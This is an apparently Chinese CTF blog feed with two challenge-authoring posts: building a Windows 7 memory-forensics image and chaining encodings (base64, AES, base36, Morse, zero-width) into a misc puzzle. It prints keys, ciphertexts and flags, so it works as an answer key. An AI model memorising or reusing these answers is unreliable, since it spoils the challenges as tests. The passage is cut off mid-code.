{
    "version": "https://jsonfeed.org/version/1",
    "title": "MISC",
    "subtitle": "",
    "icon": "https://dr34nn.github.io/images/favicon.ico",
    "description": "",
    "home_page_url": "https://Dr34nn.github.io",
    "items": [
        {
            "id": "https://dr34nn.github.io/2022/11/07/Windows7%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81%E5%87%BA%E9%A2%98%E8%AE%B0%E5%BD%95/",
            "url": "https://dr34nn.github.io/2022/11/07/Windows7%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81%E5%87%BA%E9%A2%98%E8%AE%B0%E5%BD%95/",
            "title": "Windows7内存取证出题记录",
            "date_published": "2022-11-06T16:00:00.000Z",
            "content_html": "<p>最近为了准备 ISCTF 的套娃题，想起来可以外层套一个取证的皮，但是本来的环境因为电脑重装就无了，所以重新用虚拟机搭了一个 Win7 的环境，然后遇到了几个之前遇到过的问题，那个时候没有记录，导致配环境浪费了很多时间，这边就小小的记录一下吧。</p>\n<h3 id=\"写在开头\"><a class=\"anchor\" href=\"#写在开头\">#</a> 写在开头：</h3>\n<p>win7 取证的话，硬盘容量建议开大一点，给 25g，他自身好像是占了 13g，然后一些补丁后续要加，我尝试了 20G，容量不够，25G 就足够的空间了</p>\n<h3 id=\"step1环境镜像\"><a class=\"anchor\" href=\"#step1环境镜像\">#</a> Step1: 环境镜像</h3>\n<p>​\t我使用的是 VMware 搭的虚拟机，去官网下的镜像，这边就直接放一篇博客了，<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNjQ5MDAxL2FydGljbGUvZGV0YWlscy8xMDU5ODkxNzMjOn46dGV4dD0lRTklOTUlOUMlRTUlODMlOEYlRTclOUElODQlRTQlQjglOEIlRTglQkQlQkQlMjAlRTclOTklQkUlRTUlQkElQTYlRTclQkQlOTElRTclOUIlOTglRTUlOUMlQjAlRTUlOUQlODAsJTI4JUU1JUI3JUIyJUU0JUI4JThCJUU4JUJEJUJEJUU1JUE1JUJEd2luZG93c3M3JTIwNjQlMjklM0ElRTklOTMlQkUlRTYlOEUlQTUlRUYlQkMlOUFodHRwcyUzQSUyRiUyRnBhbi5iYWlkdS5jb20lMkZzJTJGMWpQanFJVElfVTlmNXYzdG5pczFGLWclMjAlRTYlOEYlOTAlRTUlOEYlOTYlRTclQTAlODElRUYlQkMlOUFyYmg0\">参考博客</span>，镜像版本选取什么应该大抵是没什么问题的，实在要参考的话，我这边选择的是这款，怎么有两款，忘了是哪款了，自己试试吧，应该是 64 位的那款。</p>\n<p><img data-src=\"https://img-blog.csdnimg.cn/df339ed69054455c9386a0cfe2774bcc.png\" alt=\"\" /></p>\n<h3 id=\"step2sp1问题\"><a class=\"anchor\" href=\"#step2sp1问题\">#</a> Step2:SP1 问题</h3>\n<p>​\t出题最主要的就是问个 SP1 问题了，为什么捏，因为我想安装 vmtools，否则我的附件以及 dump 出来的内存镜像无法从虚拟机中导出来，看了网上几篇《很老》的教程，都是千篇一律的从微软官网下载补丁，然后移进去，然后安装补丁就好了，很简单，但是他们好像忽略了一个问题，没有 vmtools，我根本移不进去啊（不知道是不是我虚拟机的问题）。凭借一个 misc 手的直觉，我最后发现了一个很好地方法，就是使用 UltraISO。</p>\n<p><img data-src=\"https://img-blog.csdnimg.cn/0d0f9fddff0c407d932a90cb030c7073.png\" alt=\"\" /></p>\n<p>我们可以把自己想要传入到虚拟机中的东西，用 Ultra 打包成 iso 镜像，然后直接丢进去。</p>\n<p>ps: 试过插 U 盘，但是报错 U 盘无法解析</p>\n<h3 id=\"step3具体解决方法\"><a class=\"anchor\" href=\"#step3具体解决方法\">#</a> Step3: 具体解决方法</h3>\n<h4 id=\"1-创建iso镜像\"><a class=\"anchor\" href=\"#1-创建iso镜像\">#</a> 1、创建 ISO 镜像</h4>\n<p><img data-src=\"https://img-blog.csdnimg.cn/ebaca264a0f24239ac2b0a5b90984d89.png\" alt=\"\" /></p>\n<p>我们将自己想要移到虚拟机中的文件移动到右上方的地方，就直接点住图标拖过去就行，然后点左上角直接保存即可</p>\n<h4 id=\"2-导入镜像\"><a class=\"anchor\" href=\"#2-导入镜像\">#</a> 2、导入镜像</h4>\n<p>然后我们打开 VMware  win7 的虚拟机，导入 ISO 镜像即可</p>\n<p><img data-src=\"https://img-blog.csdnimg.cn/ed075b65b5b5457c986e52823ad30bb1.png\" alt=\"\" /></p>\n<p>然后就打开虚拟机就可以啦</p>\n<h4 id=\"3-打开文件\"><a class=\"anchor\" href=\"#3-打开文件\">#</a> 3、打开文件</h4>\n<p><img data-src=\"https://img-blog.csdnimg.cn/9bafc0912ea34883a825805280ecb389.png\" alt=\"\" /></p>\n<p>打开驱动</p>\n<p><img data-src=\"https://img-blog.csdnimg.cn/00cc92862c99464c9af78eec8553292e.png\" alt=\"\" /></p>\n<p>将里面的内容移到桌面上就好了</p>\n<h3 id=\"step4打补丁\"><a class=\"anchor\" href=\"#step4打补丁\">#</a> Step4: 打补丁</h3>\n<p>这边有两个补丁要打，一个是更新程序？还有一个就是 sp1</p>\n<p>可以自己去官网下，链接自己找，用 IDM 下很快，或者用我的百度网盘（没会员就不怪我了奥，大小 1.4G，体验 30s 应该也可以下一大部分），顺便把 dump.exe 也给啦，一个 32 位的，一个 64 位的，自己对应版本使用即可</p>\n<p>链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9wYW4uYmFpZHUuY29tL3MvMXI1QWNWOXo3VXhWMy1TZGpkRk5hWUE/cHdkPXl2NG0=\">https://pan.baidu.com/s/1r5AcV9z7UxV3-SdjdFNaYA?pwd=yv4m</span><br />\n 提取码：yv4m</p>\n<p>然后我记得好像是先装 exe 那个？无所谓，自己都试一试，两个装完之后就可以快乐地安装 vmtools 了。</p>\n<h3 id=\"step5开始出题\"><a class=\"anchor\" href=\"#step5开始出题\">#</a> Step5: 开始出题</h3>\n<p>我这边是设置了两个考点，一个是开机密码是 flag123456，他是以 hash 存储的，是可以解出来的。还有一个就是桌面上的文件</p>\n<p><img data-src=\"https://img-blog.csdnimg.cn/46ecf0a6d99546e89cced2e087f87fbc.png\" alt=\"\" /></p>\n<p>把你想要的东西放在桌面上，进阶一点，你可以在你的命令行里打一些命令，或者在你的剪切板，ie 浏览器里访问一些网站，这些就靠你自己去尝试啦。最后运行 dumpit.exe 就好了，直接拖到终端运行即可</p>\n<p><img data-src=\"https://img-blog.csdnimg.cn/3df1c2b4048f42a98b5388b592d608a9.png\" alt=\"\" /></p>\n<p>然后按下 y，一个题目就出好咯，可以去欺负小新生了，下班！</p>\n",
            "tags": [
                "MISC",
                "取证",
                "出题记录"
            ]
        },
        {
            "id": "https://dr34nn.github.io/2022/11/07/%E5%A5%97%E7%A5%9E%E7%9C%8B%E4%BA%86%E9%83%BD%E6%91%87%E5%A4%B4-%E5%87%BA%E9%A2%98%E8%AE%B0%E5%BD%95/",
            "url": "https://dr34nn.github.io/2022/11/07/%E5%A5%97%E7%A5%9E%E7%9C%8B%E4%BA%86%E9%83%BD%E6%91%87%E5%A4%B4-%E5%87%BA%E9%A2%98%E8%AE%B0%E5%BD%95/",
            "title": "《套神看了都摇头》出题记录",
            "date_published": "2022-11-06T16:00:00.000Z",
            "content_html": "<p>写在开头：想把 misc 的一些简单的知识点串在一起，更考核选手的综合能力，但是胡乱的套会导致其中解码过程中出现很多的错误，所以需要给选手一些明确的 hint，比如用什么网站进行的加密，比如一个简单的例子，千千秀字的栅栏，用 bugku 是解不出来的（反正我枚举解不出，就当他解不出了），这些知识点都是我学习 misc 刚开始一个月里面刷的题，所以就选用了过来。</p>\n<h3 id=\"flag\"><a class=\"anchor\" href=\"#flag\">#</a> flag</h3>\n<p>首先拿到了一个 flag</p>\n<p W0_b8_4_t4O_sH3n_!!!_Sh31_4_t40_sheN=\"\">ISCTF</p>\n<h3 id=\"千千秀字栅栏\"><a class=\"anchor\" href=\"#千千秀字栅栏\">#</a> 千千秀字栅栏</h3>\n<p>给出了一个千千秀字的 hint，先留档</p>\n<pre><code>IW4s!10&#125;S0_H!__C_t3_4sTb4nS_hF8O_hte&#123;__!34N\n</code></pre>\n<h3 id=\"与佛论禅\"><a class=\"anchor\" href=\"#与佛论禅\">#</a> 与佛论禅</h3>\n<p>佛曰有好几种，新佛曰跟佛曰，我这边出了一个问题就是与佛论禅也有两种，一种是佛曰，一种是佛又曰，这两个的网址是不一样的</p>\n<p><img data-src=\"https://img-blog.csdnimg.cn/dec947068e764695b4cf5396f260d3db.png\" alt=\"\" /></p>\n<p><img data-src=\"https://img-blog.csdnimg.cn/eab6fa9040e9403b84956287672760f1.png\" alt=\"\" /></p>\n<p>虽然说问题不大，但是谨记</p>\n<pre><code>佛又曰：楞苏喝帝婆醯伽婆夜婆数遮钵娑孕度利伽咩唵钵呼度曳婆写曳尼迦卢罚数菩伽嚧阇耶俱钵阿地怛度卢咩阇萨钵俱数帝舍伽呼写阇遮墀楞室提豆哆咩数输咩谨皤俱吉怛驮伊伽埵漫漫\n</code></pre>\n<h3 id=\"base64\"><a class=\"anchor\" href=\"#base64\">#</a> base64</h3>\n<p>然后就是简单的套了一个 base</p>\n<pre><code>5L2b5Y+I5puw77ya5qWe6IuP5Zad5bid5amG6Yav5Ly95amG5aSc5amG5pWw6YGu6ZK15aiR5a2V5bqm5Yip5Ly95ZKp5ZS16ZK15ZG85bqm5puz5amG5YaZ5puz5bC86L+m5Y2i572a5pWw6I+p5Ly95Zqn6ZiH6IC25L+x6ZK16Zi/5Zyw5oCb5bqm5Y2i5ZKp6ZiH6JCo6ZK15L+x5pWw5bid6IiN5Ly95ZG85YaZ6ZiH6YGu5aKA5qWe5a6k5o+Q6LGG5ZOG5ZKp5pWw6L6T5ZKp6LCo55qk5L+x5ZCJ5oCb6amu5LyK5Ly95Z+15ryr5ryr\n</code></pre>\n<h3 id=\"aeshttpswwwsojsoncomencrypt_aeshtml\"><a class=\"anchor\" href=\"#aeshttpswwwsojsoncomencrypt_aeshtml\">#</a> AES(<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc29qc29uLmNvbS9lbmNyeXB0X2Flcy5odG1s\">https://www.sojson.com/encrypt_aes.html</span>)</h3>\n<p>简单套一个 AES，也是选用了最简单的无脑的没有偏移的 AES，但是我不是很清楚他的 key 是怎么处理的，我使用相同的 key 去别的网站加密得到的不是一个密文（日后有空去看看，估计是没空的），所以这边也给出了 hint，加密网站，按下不表 * 2</p>\n<pre><code>U2FsdGVkX19fGDp6HBRwc0ot+XQFmWrHPBhG0F2Y4JyJhRomofwFXBnUZUPnQc9V\nhviHIwagGUMvhlGtnHOjWUN/69h1eku4YWeTL2bswkotj1GImP36TzV3G+z1yYqy\nLGez1wUKbtuNpVfSU2/u79oAubWN8mVtMUalmNoYjtP3adjM5p/zXL6kul+kSJ95\nBX50RqBV64MyFs1rNM7r3wI8W8FWNYpvDdzETKuCMEQwXtaH1HS6p/P5kuMT7OIW\n3ViHDuthWBS+Z1sUZh6Hk2R4db3HrZYCLZ5QLpoNIt2ZrtVwMGPdLeI92v5w++0o\nDmW2pD7FICDFEVXB+DH+WTvdTYfXGM6635R94r72bREmE1zELyMy3iMqiF7UOmd3\nCfEhlz5aiv9RBGz2crCaDJ/ZMY9+qEj4JEYJJMFljKG71kXUC/xvNcGTb7oN4odk\nOKV+I3Tuc8GcYq03zczLkA==\n\nkey=this_is_pass\n</code></pre>\n<h3 id=\"36进制\"><a class=\"anchor\" href=\"#36进制\">#</a> 36 进制</h3>\n<p>这边是套了一个 36 进制，如果细心点的话，应该是可以发现里面文本的内容是从 0-9，a-z，26 个，然后我也是给 hint 了，生怕看不出来，36 进制怎么转码呢，直接 int   36 就可以，然后再加个 long_to_bytes 就可以解码了</p>\n<pre><code>pfbshz6vy6cw9zqe9d2xuv0pevbyzmq3biqj0bbbywfowy6d2vcfamwd144au0bioijq7oyf32grvzxtodeob5quei6bufpganywzzvyuj0jv9fxn3ghgisaemw5d59ftp84lo4wseqohfhbfpily6s0d3bbs9kg5xvq481b2ykbucfwlb2290l84b9d8i7r1ofmlxtnwglzt1t3ko602oryor147dnnotdn2gmzd68yrg3lna118ppj7oygmf2yjn049fidfih3a6axagk2oxcq0diwilkahq6f0wvekvmcbzdeo44r9n6k2pdvrpubm0k1lb67f50811vaxgwbfyx2ti3w1rlvysmemq649qt8g4cjps62xss63mq30mi43mz695t1t2egqvh8q2hjr3s5mta9l5t8wid5s8q7im3sc4lsaxmc6j81macut49clhweomtrhh5d4pk0n6rfesfsesaj18w9x7otzu4v6p74vtpec8spkbhc99g04l2mz7zkk0bwghov60xgrr53f3e55bxi6ztlzwu23lwd9k985vrn4skbcb978i8knspffief1r8b7j5kdfabz8qw8sxcp70xmt9eqysxikcojpahyr9jq9opg115nz4zub2gfre0znbr0rdrw777h2h528yz1offlzfi610w6e4lwgh2o71ywdl6a6ursgb8mo2o54drm8x9cf0k89xbhb5pqwyjw0lvd4cvv8m65\n</code></pre>\n<h3 id=\"moresewav\"><a class=\"anchor\" href=\"#moresewav\">#</a> morese，wav</h3>\n<p>忘记复制密文了，这边应该是吧 36 进制转成莫斯了吧，出题脚本给你们看看</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> time</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> winsound</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>freq1<span class=\"token operator\">=</span><span class=\"token number\">1500</span>   <span class=\"token comment\">#短音发声频率</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>freq2<span class=\"token operator\">=</span><span class=\"token number\">2000</span>   <span class=\"token comment\">#长音发声频率</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>interv_short <span class=\"token operator\">=</span> <span class=\"token number\">100</span>  <span class=\"token comment\">#短音 “.” 的发声时长</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>interv_long <span class=\"token operator\">=</span> <span class=\"token number\">300</span>   <span class=\"token comment\">#长音 “-” 的发声时长</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>msg <span class=\"token operator\">=</span> <span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">'输入要发送的消息:'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>msg <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>upper<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>   <span class=\"token comment\">#转换大写，摩斯码中不区分大小写</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>code_dict <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token string\">'0'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'-----'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'1'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'.----'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'2'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'..---'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'3'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'...--'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'4'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'....-'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>             <span class=\"token string\">'5'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'.....'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'6'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'-....'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'7'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'--...'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'8'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'---..'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'9'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'----.'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>             <span class=\"token string\">'A'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'.-'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'B'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'-...'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'C'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'-.-.'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'D'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'-..'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'E'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'.'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'F'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'..-.'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'G'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'--.'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>             <span class=\"token string\">'H'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'....'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'I'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'..'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'J'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'.---'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'K'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'-.-'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'L'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'.-..'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'M'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'--'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'N'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'-.'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>             <span class=\"token string\">'O'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'---'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'P'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'.--.'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'Q'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'--.-'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'R'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'.-.'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'S'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'...'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'T'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'-'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>             <span class=\"token string\">'U'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'..-'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'V'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'...-'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'W'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'.--'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'X'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'-..-'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'Y'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'-.--'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Z'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'--..'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>             <span class=\"token string\">'.'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'.-.-.-'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">':'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'---...'</span><span class=\"token punctuation\">,</span><span class=\"token string\">','</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'--..--'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">';'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'-.-.-.'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'?'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'..--..'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>             <span class=\"token string\">'='</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'-...-'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"'\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'.----.'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'/'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'-..-.'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'!'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'-.-.--'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'--'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'-....-'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>             <span class=\"token string\">'-'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'..--.-'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'\"'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'.-..-.'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'('</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'-.--.'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">')'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'-.--.-'</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">for</span> m <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'m:'</span><span class=\"token punctuation\">,</span>m<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    code <span class=\"token operator\">=</span> code_dict<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">[</span>m<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">if</span> code <span class=\"token keyword\">is</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'该符号不在字典中'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token keyword\">continue</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'code'</span><span class=\"token punctuation\">,</span>code<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token keyword\">for</span> c <span class=\"token keyword\">in</span> code<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token keyword\">if</span> c <span class=\"token operator\">==</span> <span class=\"token string\">'.'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>            ret <span class=\"token operator\">=</span> winsound<span class=\"token punctuation\">.</span>Beep<span class=\"token punctuation\">(</span>freq1<span class=\"token punctuation\">,</span>interv_short<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>            <span class=\"token comment\"># print('ret = ',ret)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>            time<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#加入 0.1s 延时</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        <span class=\"token keyword\">elif</span> c <span class=\"token operator\">==</span> <span class=\"token string\">'-'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>            ret <span class=\"token operator\">=</span> winsound<span class=\"token punctuation\">.</span>Beep<span class=\"token punctuation\">(</span>freq2<span class=\"token punctuation\">,</span>interv_long<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>            <span class=\"token comment\"># print('ret = ',ret)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>            time<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'错误编码'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    time<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>脚本也是网上 B 站上找的，不是自己写的，但是看了下也是可以理解的，主要就是 winsound.Beep 控制声音长短，发出声音，然后使用电脑的立体声混音录就好了（这个灵感来自春哥，之前看群里讨论 mmstv 看到的）</p>\n<p>然后就得到了一个.wav 文件了</p>\n<p>这边将前面的 hint 都给到了 Audacity 的元数据标签里面（编辑元数据）</p>\n<p><img data-src=\"https://img-blog.csdnimg.cn/474d1f0f636a45c3aadd3ad98850c4d1.png\" alt=\"\" /></p>\n<p>但是我没有保存，所以直接查看属性不能看到。</p>\n<h3 id=\"百度网盘\"><a class=\"anchor\" href=\"#百度网盘\">#</a> 百度网盘</h3>\n<p>这边因为文件太大了，然后就直接转网盘变小</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wYW4uYmFpZHUuY29tL3MvMUhrcDdwdC03WWcwOF83djV6d0ZNdUE/cHdkPXQ1MXI=\">https://pan.baidu.com/s/1Hkp7pt-7Yg08_7v5zwFMuA?pwd=t51r</span></p>\n<h3 id=\"零宽\"><a class=\"anchor\" href=\"#零宽\">#</a> 零宽</h3>\n<p>将百度网盘的链接存在一个零宽里面去，这边可能好多人都还没搞懂零宽到底怎么搞，只会复制进去，然后解码，其实很简单</p>\n<p>一般来说怎么判断就是把字符全选，复制到 kali 虚拟机里面</p>\n<p><img data-src=\"https://img-blog.csdnimg.cn/5f75511def644d2fa29cf6f2b9631ab5.png\" alt=\"\" /></p>\n<p>我们可以看到，在字符串中有着许多的不可见字符就是 Unicode 字符，由此我们可以得到</p>\n<p><img data-src=\"https://img-blog.csdnimg.cn/85b6e5433e4b4b47bb9a32029b2ca670.png\" alt=\"\" /></p>\n<p>关于这边解密的东西，不是乱选的，而是根据上面所包含的字符来选的，然后直接 decode 就可以得到</p>\n<h3 id=\"压缩逆序转01改黑白出二维坐标indextxt\"><a class=\"anchor\" href=\"#压缩逆序转01改黑白出二维坐标indextxt\">#</a> 压缩，逆序，转 01，改黑白，出二维坐标 index.txt</h3>\n<p>然后将得到的文本进行压缩包，然后读取，将他逆序，转成 01 字符串，再将 01 字符串转成黑白图片。可以将他看成二维数组，给出坐标。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> math</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> PIL</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">from</span> PIL <span class=\"token keyword\">import</span> Image</pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'flag.zip'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'rb'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    data  <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    a<span class=\"token operator\">=</span><span class=\"token builtin\">bin</span><span class=\"token punctuation\">(</span>bytes_to_long<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>zfill<span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token 